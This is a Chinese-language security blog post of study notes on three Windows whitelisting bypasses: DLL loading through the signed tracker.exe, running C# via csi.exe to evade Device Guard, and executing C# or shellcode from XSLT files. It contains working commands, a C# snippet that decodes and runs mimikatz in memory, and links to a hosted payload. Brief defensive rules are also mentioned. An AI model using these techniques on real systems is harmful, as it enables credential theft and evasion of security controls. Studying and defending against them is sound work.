---
layout: post
title: Study Notes Weekly No.4(Use tracker to load dll & Use csi to bypass UMCI & Execute C# from XSLT file)
---


**About:**

- use tracker to load dll


- use csi to bypass Application Whitelisting


- execute C# from XSLT file


**目录:**

- 介绍利用tracker.exe加载dll的方法

- 如何利用csi.exe绕过Windows Device Guard

- 在XSLT文件转换过程中执行C#代码


## 0x01 use tracker to load dll
---

**Reference:**

https://twitter.com/subTee/status/793151392185589760


![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/2-1.png)



**简介：**


Casey在Twitter分享的一个技巧，利用tracker.exe能够创建进程，注入dll，特别的是tracker.exe来自于SDK中，包含微软的数字签名，本文将要分享利用该技巧的一些心得,补充一个直接利用tracker.exe加载dll的技巧


**Tracker.exe：**

Tracker.exe is used to start a process and inject FileTracker.dll into it just after creation.

The file accesses of the target process are tracked, and written to a .tlog file

常见目录(需要安装SDK):

- C:\Program Files (x86)\Microsoft SDKs\Windows\v8.1A\bin\NETFX 4.5.1 Tools

- C:\Program Files (x86)\Microsoft SDKs\Windows\v10.0A\bin\NETFX 4.6.1 Tools\x64


**语法：**

```
Tracker.exe [选项] [@跟踪器响应文件] /c [命令行]

 /d 文件.dll                : 使用跟踪 dll 文件.dll 启动进程。(默认值: 通过 PATH 提供的 FileTracker.dll)

 /i[f] <路径>               :  用于跟踪日志输出的中间目录。(使用 /if 可立即将路径展开为完整路径)(默认值: 所跟踪进程中的当前目录)

 /o                         : 对每个文件执行跟踪操作

 /m                         : 在跟踪日志中包含缺少的文件，即在进程关闭之前删除的那些文件

 /u                         : 不从跟踪日志中删除重复的文件操作

 /t                         : 跟踪命令行(将展开使用“@文件名”语法指定的响应文件)

 /a                         : 启用扩展跟踪: GetFileAttributes、GetFileAttributesEx

 /e                         : 启用扩展跟踪: GetFileAttributes、GetFileAttributesEx、RemoveDirectory、CreateDirectory

 /k                         : 在跟踪日志文件名中保留完整的工具链

 /r 文件 1;文件 2;..;文件 n : 正在跟踪的主要根输入文件(默认值: 无)

 /c [命令行]                : 要跟踪的命令(必须是最后一个参数)

 /?                         : 本帮助文本
```

**实际测试：**

cmd下运行：

```
Tracker.exe /d test.dll /c cmd.exe
```

如图，成功加载test.dll

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/2-2.png)


test.dll为默认包含导出函数的dll就好，示例代码如下：

```
#include "stdafx.h"
#include <windows.h>
BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
           )
{
  switch (ul_reason_for_call)
  {
  case DLL_PROCESS_ATTACH:
    MessageBox(NULL,L"testexport", L"testexport",MB_OK);
  case DLL_THREAD_ATTACH:
  case DLL_THREAD_DETACH:
  case DLL_PROCESS_DETACH:
    break;
  }
  return TRUE;
}
```

**分析：**

这个技巧有如下特点：

- tracker.exe包含微软数字签名，可绕过应用程序白名单的限制

- tracker.exe可以在启动进程的同时加载dll

但是如果只想通过tracker.exe加载dll的话，存在以下问题：

选择不存在或是权限不够的进程，无法加载dll

但是，可以通过一个特殊的进程来解决这个问题，如`svchost.exe`，那么在加载dll后，进程svchost.exe可以自动退出,这就实现了通过tracker.exe加载dll


**防御：**

对tracker.exe添加黑名单规则





## 0x02 use csi to bypass Application Whitelisting
---

**Reference:**

http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html

**简介：**

同样是利用带有微软签名的exe绕过白名单的技巧，Matt Graeber曾介绍过如何利用cdb.exe绕过Windows Device Guard，Casey这次介绍的是使用C#相关的csi.exe绕过Windows Device Guard的技巧，本文将分享这个技巧的研究心得，并完成Casey在博客中留给读者的作业——在win10未安装VS2015的环境下如何使用csi.exe


**csi.exe：**

在Visual Studio 2015 Update 1引入

安装后位置在C:\Program Files (x86)\MSBuild\14.0\Bin


**实际测试：**

测试系统：

Win10 安装Visual Studio 2015

 **1.在csi编译环境中直接执行代码**
 
直接运行csi.exe会进入编译环境，可在里面直接填入代码并运行

如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/3-1.png)




测试Casey在文章中的代码，从文件中读取base64加密过的mimikatz.exe，解密执行，代码如下：

```
using System;
using System.Reflection;
string s = System.IO.File.ReadAllText(@"c:\\test\\katz.txt");
byte[] b = System.Convert.FromBase64String(s);
Assembly a = Assembly.Load(b);
MethodInfo method = a.EntryPoint;
object o = a.CreateInstance(method.Name);
method.Invoke(o, null);
```

 
mimikatz.exe作base64加密后保存的文件katz.txt已上传，地址为：
https://raw.githubusercontent.com/3gstudent/test/master/katz.txt


测试如图，成功解密并执行mimikatz.exe

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/3-2.png)


**2.执行.csx文件中的代码**

将上述测试代码写在katz.csx文件中

csi编译环境下运行：

```
#load "c:\\test\\katz.csx"
```

**注:**

文件路径必须包含双引号，load前缀`#`

测试如图，成功执行

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/3-3.png)

**3.在cmd下运行**

可在cmd下csi.exe后面直接加.csx文件的路径

例如:

```
"C:\Program Files (x86)\MSBuild\14.0\Bin\csi.exe" c:\test\katz.csx
```

测试如图，成功执行

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/3-4.png)

当然，在Win10上面不是必须安装vs2015才能使用csi.exe，这也是Casey留给读者的作业，找到csi.exe使用需要的依赖项


我已经完成了这个作业，依赖项文件最少需要6.77MB，可在csi.exe的同级目录`C:\Program Files (x86)\MSBuild\14.0\Bin`下找到，将csi.exe及其依赖性上传到Win10系统即可直接使用

依赖项文件列表如下：

- Microsoft.CodeAnalysis.CSharp.dll
- Microsoft.CodeAnalysis.CSharp.Scripting.dll
- Microsoft.CodeAnalysis.dll
- Microsoft.CodeAnalysis.Scripting.dll
- System.AppContext.dll
- System.Collections.Immutable.dll
- System.IO.FileSystem.dll
- System.IO.FileSystem.Primitives.dll
- System.Reflection.Metadata.dll

**补充：**

该方法只用于Win10

**防御：**
Matt Graeber分享了他的应对方法，更新了Device Guard Bypass MitigationRules，地址如下：

https://twitter.com/mattifestation/status/781211230065332224

https://github.com/mattifestation/DeviceGuardBypassMitigationRules/


## 0x03 execute C# from XSLT file
---

**Reference:**

https://twitter.com/subTee/status/796737674954608641

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/4-1.png)


**POC地址:**

https://gist.github.com/subTee/c34d0499e232c1501ff9f0a8dd302cbd#file-script-ps1

**简介：**

Casey在Twitter分享了一个有意思的技巧，在XSLT文件转换的过程中执行C#代码，本节将分享这个技巧的心得，并扩充POC，结合之前的代码，实现通过XSLT文件执行shellcode


**XSLT：**

XSLT是extensible stylesheet language transformation(扩展样式表转换语言)的缩写

用于将XML文档转换成以下一种格式：
- HTML
- XML
- XHTML
- XSLT
- 文本

在转换操作的过程中，可以执行c#或VB代码，同VisualStudio Persistence中在编译过程执行代码类似

XSLT在web前端中用的比较多

**实际测试：**

将calc.xslt，example.xml，script.ps1三个文件放于同级目录，设置script.ps1中的路径变量$path

执行script.ps1，生成output.xml，弹出计算器，如图

![Alt text](https://raw.githubusercontent.com/3gstudent/BlogPic/master/2016-11-16/4-2.png)


参考如下链接可获得编写XSLT的更多提示：
https://msdn.microsoft.com/en-us/library/wxaw5z5e(v=vs.110).aspx


于是基于之前的研究，实现了通过XSLT调用C#执行shellcode，地址如下：

https://github.com/3gstudent/Execute-CSharp-From-XSLT-TEST/

**注:**

主要是修改了calc.xslt文件


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)
